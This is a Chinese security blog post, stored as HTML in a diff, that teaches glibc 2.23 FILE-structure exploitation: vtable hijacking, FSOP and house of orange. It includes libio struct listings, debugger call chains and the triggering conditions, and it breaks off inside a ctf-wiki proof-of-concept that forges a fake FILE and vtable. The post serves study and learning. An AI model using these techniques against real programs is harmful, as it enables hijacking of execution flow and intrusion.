@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="这个文章的利用争对2.23的版本，主要是在初学io之后学习一下老版本的简单的io利用，因为2.24就加入了vtable检查机制无法再构造vtable。  IO_FILE-2.23劫持vtable、FSOP、house of orangevtable劫持原理首先需要知道_IO_FILE_plus这个结构体位于/libio/libioP.h，如下所示 12345struct _IO_FILE_p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO_FILE-2.23劫持vtable、FSOP、house of orange">
+<meta property="og:url" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="这个文章的利用争对2.23的版本，主要是在初学io之后学习一下老版本的简单的io利用，因为2.24就加入了vtable检查机制无法再构造vtable。  IO_FILE-2.23劫持vtable、FSOP、house of orangevtable劫持原理首先需要知道_IO_FILE_plus这个结构体位于/libio/libioP.h，如下所示 12345struct _IO_FILE_p">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/2.png">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/3.png">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/4.png">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/5.png">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/6.png">
+<meta property="og:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/7.png">
+<meta property="article:published_time" content="2021-10-09T07:20:04.000Z">
+<meta property="article:modified_time" content="2022-08-31T14:30:55.791Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>IO_FILE-2.23劫持vtable、FSOP、house of orange</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/10/09/IO-FILE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;text=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;is_video=false&amp;description=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IO_FILE-2.23劫持vtable、FSOP、house of orange&amp;body=Check out this article: http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;title=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;name=IO_FILE-2.23劫持vtable、FSOP、house of orange&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/09/IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/&amp;t=IO_FILE-2.23劫持vtable、FSOP、house of orange"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IO-FILE-2-23%E5%8A%AB%E6%8C%81vtable%E3%80%81FSOP%E3%80%81house-of-orange"><span class="toc-number">1.</span> <span class="toc-text">IO_FILE-2.23劫持vtable、FSOP、house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vtable%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">vtable劫持原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSOP"><span class="toc-number">1.2.</span> <span class="toc-text">FSOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.3.</span> <span class="toc-text">house of orange</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        IO_FILE-2.23劫持vtable、FSOP、house of orange
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-09T07:20:04.000Z" itemprop="datePublished">2021-10-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="3">
+
+<blockquote>
+<p>这个文章的利用争对2.23的版本，主要是在初学io之后学习一下老版本的简单的io利用，因为2.24就加入了vtable检查机制无法再构造vtable。</p>
+</blockquote>
+<h1 id="IO-FILE-2-23劫持vtable、FSOP、house-of-orange"><a href="#IO-FILE-2-23劫持vtable、FSOP、house-of-orange" class="headerlink" title="IO_FILE-2.23劫持vtable、FSOP、house of orange"></a>IO_FILE-2.23劫持vtable、FSOP、house of orange</h1><h2 id="vtable劫持原理"><a href="#vtable劫持原理" class="headerlink" title="vtable劫持原理"></a>vtable劫持原理</h2><p>首先需要知道<code>_IO_FILE_plus</code>这个结构体位于<code>/libio/libioP.h</code>，如下所示</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>_IO_FILE</code>定义如下，位于<code>/libio/libio.h</code></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> {</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>位于<code>/libio/libioP.h</code>，如下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<p>试想一下如果可以控制FILE结构体，并对vtable指针进行修改，将vtable劫持到可控内存并在该内存中伪造好vtable，最后通过调用相应的IO函数即可达到劫持程序执行流的目的。前面调试过IO函数所以还是挺好理解此利用方法的</p>
+<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>通过前一个文章可知所有文件结构体会使用<code>_IO_list_all</code>来进行管理，通过_chain字段进行链接</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all-&gt;file._chain</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">struct</span> _IO_FILE *) <span class="number">0x7ffff7dd2620</span> &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p _IO_list_all-&gt;file._chain._chain</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">struct</span> _IO_FILE *) <span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p _IO_list_all-&gt;file._chain._chain._chain</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE *) <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以FSOP的利用主要是将<code>_IO_list_all</code>劫持到可控地方，但是这样只是伪造了数据，还需要选择某种方式进行触发，在FSOP中选择的触发方法是通过调用 <code>_IO_flush_all_lockp</code>这个函数，这个函数会刷新 <code>_IO_list_all </code>链表中所有项的文件流，文件在<code>libio\genops</code>中</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">{</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  {</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           {</span><br><span class="line">               result = EOF;</span><br><span class="line">          }</span><br><span class="line">        ...</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>触发<code>_IO_flush_all_lockp</code>这个函数有以下几点方法</p>
+<blockquote>
+<ul>
+<li>执行abort函数</li>
+<li>执行exit函数</li>
+<li>程序从main函数返回时</li>
+</ul>
+</blockquote>
+<p>首先可以看一下执行exit函数时的调用链</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x7ffff7a89030</span> _IO_flush_all_lockp</span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x7ffff7a8933a</span> _IO_cleanup+<span class="number">26</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7a46fab</span> __run_exit_handlers+<span class="number">139</span></span><br><span class="line">  f <span class="number">3</span>   <span class="number">0x7ffff7a47055</span></span><br><span class="line">  f <span class="number">4</span>   <span class="number">0x555555555166</span></span><br><span class="line">  f <span class="number">5</span>   <span class="number">0x7ffff7a2d840</span> __libc_start_main+<span class="number">240</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来是abort函数时的调用链，可以利用double free来触发</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x7ffff7a89030</span> _IO_flush_all_lockp</span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x7ffff7a43fcd</span> <span class="built_in">abort</span>+<span class="number">253</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7a847fa</span></span><br><span class="line">  f <span class="number">3</span>   <span class="number">0x7ffff7a8d38a</span> _int_free+<span class="number">1578</span></span><br><span class="line">  f <span class="number">4</span>   <span class="number">0x7ffff7a8d38a</span> _int_free+<span class="number">1578</span></span><br><span class="line">  f <span class="number">5</span>   <span class="number">0x7ffff7a9158c</span> <span class="built_in">free</span>+<span class="number">76</span></span><br><span class="line">  f <span class="number">6</span>   <span class="number">0x5555555551a2</span> main+<span class="number">57</span></span><br><span class="line">  f <span class="number">7</span>   <span class="number">0x7ffff7a2d840</span> __libc_start_main+<span class="number">240</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来是程序从main函数返回时，可以看到call exit</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x555555555129</span> &lt;main&gt;                     endbr64</span><br><span class="line">  <span class="number">0x55555555512d</span> &lt;main+<span class="number">4</span>&gt;                   push   rbp</span><br><span class="line">  <span class="number">0x55555555512e</span> &lt;main+<span class="number">5</span>&gt;                   mov    rbp, rsp</span><br><span class="line">  <span class="number">0x555555555131</span> &lt;main+<span class="number">8</span>&gt;                   mov    dword ptr [rbp - <span class="number">4</span>], edi</span><br><span class="line">  <span class="number">0x555555555134</span> &lt;main+<span class="number">11</span>&gt;                  mov    qword ptr [rbp - <span class="number">0x10</span>], rsi</span><br><span class="line">  <span class="number">0x555555555138</span> &lt;main+<span class="number">15</span>&gt;                  mov    eax, <span class="number">0</span></span><br><span class="line">  <span class="number">0x55555555513d</span> &lt;main+<span class="number">20</span>&gt;                  pop    rbp</span><br><span class="line">  <span class="number">0x55555555513e</span> &lt;main+<span class="number">21</span>&gt;                  ret</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x7ffff7a2d840</span> &lt;__libc_start_main+<span class="number">240</span>&gt;    mov    edi, eax</span><br><span class="line">  <span class="number">0x7ffff7a2d842</span> &lt;__libc_start_main+<span class="number">242</span>&gt;    call   <span class="built_in">exit</span>                &lt;<span class="built_in">exit</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在梳理一下完整的FSOP利用链，需要拿到libc基址然后算出<code>_IO_list_all</code>，接着利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，然后触发<code>_IO_flush_all_lockp</code>，触发这个的最终目的是调用<code>_IO_OVERFLOW</code>，想要调用<code>_IO_OVERFLOW</code>还需要绕过一些限制，如下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           {</span><br><span class="line">               result = EOF;</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>需要使得<code>fp-&gt;_mode &lt;= 0</code>并且<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，最终就可以劫持程序执行流</p>
+<p>这里用ctf wiki的程序示例</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+vtable_offset)=((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span 